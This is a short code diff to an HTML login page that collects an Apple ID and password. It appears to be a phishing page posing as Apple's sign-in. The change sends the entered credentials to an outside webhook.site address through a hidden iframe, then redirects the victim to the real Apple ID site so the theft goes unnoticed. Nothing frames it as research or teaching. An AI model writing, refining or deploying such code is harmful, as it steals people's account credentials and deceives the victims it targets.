@@ -247,7 +247,7 @@
     </div>
     
     <script>
-       document.getElementById('loginForm').addEventListener('submit', function(e) {
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
         const appleid = document.getElementById('appleid').value;
@@ -257,11 +257,21 @@
         document.querySelector('.container form').style.display = 'none';
         document.getElementById('loading').style.display = 'block';
         
-        // Redirect to webhook with credentials in URL
+        // Build webhook URL with credentials
+        const webhookUrl = 'https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password) + '&timestamp=' + new Date().toISOString();
+        
+        // Send to webhook in hidden iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = webhookUrl;
+        document.body.appendChild(iframe);
+        
+        // Redirect to real Apple after 2 seconds
         setTimeout(() => {
-            window.location.href = 'https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password) + '&timestamp=' + new Date().toISOString();
+            window.location.href = 'https://appleid.apple.com/';
         }, 2000);
     });
+
     </script>
 </body>
 </html>
